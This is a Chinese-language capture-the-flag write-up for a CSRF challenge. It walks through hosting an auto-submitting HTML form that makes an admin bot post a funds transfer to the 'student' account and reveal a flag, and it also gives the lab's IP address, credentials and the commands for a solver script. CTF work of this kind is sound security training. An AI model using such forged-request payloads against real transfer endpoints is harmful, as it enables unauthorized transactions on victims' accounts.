# 16-csrf-post-transfer 手工复刻

## 结论

这题是 POST CSRF：`/transfer` 没有 CSRF token，也不校验 Referer/Origin。把一个自动提交表单的 HTML 托管到站内 `/pages/<id>`，再提交给 admin bot，bot 访问后会以 admin 身份给 `student` 转账。只有 **admin -> 某用户的第一笔转账** 会在收件箱附带 flag。

## 手工步骤

### 1. 登录

访问：

```text
http://47.120.76.57:34293/login
```

账号密码：

```text
student / student
```

### 2. 确认转账接口

访问：

```text
/transfer
```

表单参数是：

```text
to
amount
```

页面提示无 CSRF token、无 Referer 校验。

### 3. 托管 CSRF 页面

访问：

```text
/pages/host
```

填入下面 HTML：

```html
<!doctype html>
<html>
<body>
<form id="f" action="/transfer" method="post">
  <input type="hidden" name="to" value="student">
  <input type="hidden" name="amount" value="1">
</form>
<script>
setTimeout(function(){ document.getElementById('f').submit(); }, 200);
</script>
</body>
</html>
```

提交后会得到类似：

```text
/pages/1b2961bfea64
```

记住这个相对路径。

### 4. 提交给 admin bot

访问：

```text
/pages/submit
```

填入刚才生成的相对路径，例如：

```text
/pages/1b2961bfea64
```

注意：这里要填 `/pages/<id>`，不要填完整 URL。

### 5. 等待并查看收件箱

等待 20~60 秒，然后访问：

```text
/inbox
```

如果 bot 正常，会看到 admin 转账消息，并附带：

```text
TOGOGO-flag{...}
```

## 自动脚本

```bash
cd /Users/zlux/Project/Active/gkdctf/16-csrf-post-transfer
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
python3 main.py --base http://47.120.76.57:34293 --wait 180
```

如果不想让脚本先做 student->student 自检：

```bash
python3 main.py --base http://47.120.76.57:34293 --wait 180 --no-self-check
```

## 常见坑

1. `/pages/submit` 只接受真实生成的相对路径 `/pages/<12位hex>`。
2. 不要提交 `http://47.120.76.57:34293/pages/xxx`，也不要提交 `http://127.0.0.1:34293/pages/xxx`。
3. payload 里的 `action` 用 `/transfer`，不要写外网完整地址，因为 bot 在本机同源环境访问。
4. 自己 student->student 转账不会消耗 flag；题目说的是只有 admin->用户的第一笔会附带 flag。
5. 如果脚本显示直连转账成功、bot 提交成功，但一直没有 `admin_msg`，一般是 bot 没跑或实例状态异常，重开实例后马上跑脚本。
